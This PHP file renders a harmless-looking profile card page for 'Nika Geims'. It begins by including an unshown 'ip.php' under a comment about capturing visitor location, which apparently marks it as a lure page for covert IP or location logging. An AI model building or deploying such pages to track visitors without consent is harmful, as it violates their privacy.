<?php
include 'ip.php';

// Add JavaScript to capture location
echo '
<html>

<head>

  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1" />
  <title>gunlols</title>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <link type="text/css" rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
  <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at top, #700000, #000);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      overflow: hidden;
    }
body::before {
  content: "";
  position: absolute;
  inset: 0;
  background:
    url("baner-GTP.png") center/cover no-repeat,   /* ფოტო */
    repeating-linear-gradient(
      135deg,
      rgba(159, 0, 0, 0.937),
      rgb(38, 0, 0) 15px,
      transparent 15px,
      transparent 30px
    ); /* შენი ძველი დიზაინი */
  z-index: 0;
}


    .card {
      position: relative;
      width: 360px;
      background: linear-gradient(180deg, #4e0000, #120000);
      border-radius: 20px;
      padding: 30px 20px;
      text-align: center;
      box-shadow: 0 0 40px rgba(255,0,0,0.4);
      z-index: 1;
    }

    .avatar {
      width: 110px;
      height: 110px;
      margin: 0 auto 10px;
      border-radius: 50%;
      overflow: hidden;
      border: 4px solid red;
      box-shadow: 0 0 20px red;
    }

    .avatar img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }

    h1 {
      font-size: 26px;
      color: red;
      text-shadow: 0 0 10px red;
      margin-bottom: 5px;
    }

    .role {
      font-size: 15px;
      opacity: 0.9;
      margin-bottom: 15px;
    }

    .status {
      background: #000;
      padding: 10px;
      border-radius: 10px;
      font-size: 13px;
      margin-bottom: 18px;
      box-shadow: inset 0 0 10px red;
    }

    .socials {
      display: flex;
      justify-content: center;
      gap: 14px;
      margin-bottom: 20px;
    }

    .socials a {
      width: 40px;
      height: 40px;
      background: red;
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      text-decoration: none;
      font-size: 18px;
      box-shadow: 0 0 12px red;
      transition: 0.3s;
    }

    .socials a:hover {
      transform: scale(1.15);
      box-shadow: 0 0 25px red;
    }

    .music {
      background: #140000;
      border-radius: 14px;
      padding: 15px;
      box-shadow: inset 0 0 15px red;
    }

    .music-title {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
      color: red;
    }

    input[type="range"] {
      width: 100%;
    }

    .controls {
      margin-top: 10px;
      font-size: 18px;
    }

    .controls i {
      margin: 0 8px;
      cursor: pointer;
      color: white;
    }

  </style>
</head>

<body>

  <div class="card">

    <div class="avatar">
      <img src="tam20.webp" alt="Avatar">
    </div>

    <h1>Nika Geims</h1>
    <div class="role">👑 Full Time Developer 👑</div>

    <div class="status">
      gilocav axal wels  <br>
      xo magari propilia
    </div>
    <div class="socials">
      <a href="#"><i class="fa fa-facebook"></i></a>
      <a href="#"><i class="fa fa-twitter"></i></a>
      <a href="#"><i class="fa fa-instagram"></i></a>
      <a href="#"><i class="fa fa-linkedin"></i></a>
    </div>
    <div class="music">
      <div class="music-title">
        <span>magari muzonia</span>
      </div>

      <input type="range" value="20">
    </div>

  </div>

</body>
</html>

';
exit;
?>  

